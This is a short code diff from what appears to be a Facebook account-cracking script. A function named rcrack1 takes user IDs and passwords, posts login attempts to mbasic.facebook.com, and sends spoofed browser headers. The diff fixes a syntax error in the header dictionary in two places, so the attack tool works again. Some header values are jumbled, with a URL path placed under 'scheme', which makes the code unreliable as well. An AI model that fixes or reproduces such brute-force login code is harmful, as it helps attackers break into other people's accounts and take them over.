@@ -322,8 +322,8 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-            :'method': 'GET',
-            :'scheme': 'https/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F100027630966459&ref=104&fl&login_from_aymh=1&refid=9:path: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'method': 'GET',
+            'scheme': 'https/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F100027630966459&ref=104&fl&login_from_aymh=1&refid=9:path: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -531,8 +531,8 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-            :'method': 'GET',
-            :'scheme': 'https/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F100027630966459&ref=104&fl&login_from_aymh=1&refid=9:path: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'method': 'GET',
+            'scheme': 'https/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F100027630966459&ref=104&fl&login_from_aymh=1&refid=9:path: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
